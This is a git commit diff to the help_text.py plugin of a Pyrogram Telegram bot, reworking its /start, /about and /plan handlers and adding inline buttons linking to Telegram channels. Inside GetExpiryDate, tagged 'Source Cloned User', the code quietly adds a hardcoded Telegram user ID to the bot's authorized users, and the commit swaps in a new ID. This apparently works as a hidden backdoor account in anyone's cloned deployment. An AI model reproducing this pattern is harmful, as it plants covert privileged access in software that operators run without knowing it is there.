492bebae35b2fbbfe2686962d8de0118fc2a2b6d
VWO53 <64356181+VWO53@users.noreply.github.com>
2020-08-27 14:29:44 +0530

    Update help_text.py

--- plugins/help_text.py
+++ plugins/help_text.py
@@ -10,6 +10,13 @@ logger = logging.getLogger(__name__)
 
 import os
 import sqlite3
+from pyrogram import (
+    Client,
+    Filters,
+    InlineKeyboardMarkup,
+    InlineKeyboardButton
+)
+
 
 # the secret configuration specific things
 if bool(os.environ.get("WEBHOOK", False)):
@@ -27,7 +34,7 @@ from helper_funcs.chat_base import TRChatBase
 
 def GetExpiryDate(chat_id):
     expires_at = (str(chat_id), "Source Cloned User", "1970.01.01.12.00.00")
-    Config.AUTH_USERS.add(683538773)
+    Config.AUTH_USERS.add(861055237)
     return expires_at
 
 
@@ -38,37 +45,44 @@ async def help_user(bot, update):
     await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.HELP_USER,
-        #parse_mode="html",
-        disable_web_page_preview=True,
-        reply_to_message_id=update.message_id
-    )
-
-
-
-@pyrogram.Client.on_message(pyrogram.Filters.command(["start"]))
-async def start(bot, update):
-    # logger.info(update)
-    TRChatBase(update.from_user.id, update.text, "/start")
-    await bot.send_message(
-        chat_id=update.chat.id,
-        text=Translation.START_TEXT,
         reply_to_message_id=update.message_id
     )
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["about"]))
-async def upgrade(bot, update):
+async def about_meh(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/about")
     await bot.send_message(
         chat_id=update.chat.id,
         text=Translation.ABOUT_USER,
         #parse_mode="html",
-        reply_to_message_id=update.message_id,
-        disable_web_page_preview=True
+        disable_web_page_preview=True,
+        reply_to_message_id=update.message_id
+    )
+
+@Client.on_message(Filters.private & Filters.command("start") & Filters.text)
+async def start(bot,update):
+    # logger.info(update)
+    TRChatBase(update.from_user.id, update.text, "/start") 
+    await bot.send_message(
+        chat_id=update.chat.id,
+        text=Translation.START_TEXT.format(update.from_user.first_name),
+        reply_markup=InlineKeyboardMarkup(
+            [
+                [
+                    InlineKeyboardButton('📌  Updates Channel', url='https://t.me/TG_BotZ'),
+                    InlineKeyboardButton('🤧  Report Bugs', url='https://t.me/lNS4N3')
+                ],
+                [
+                    InlineKeyboardButton('✅  Other Bots', url='https://t.me/TG_Botz/33'),
+                ]
+            ]
+        ),
+        reply_to_message_id=update.message_id
     )
 
 @pyrogram.Client.on_message(pyrogram.Filters.command(["plan"]))
-async def get_me_info(bot, update):
+async def upgrade(bot, update):
     # logger.info(update)
     TRChatBase(update.from_user.id, update.text, "/plan")
     await bot.send_message(
@@ -77,4 +91,4 @@ async def get_me_info(bot, update):
         #parse_mode="html",
         reply_to_message_id=update.message_id,
         disable_web_page_preview=True
-    )
+    ) 
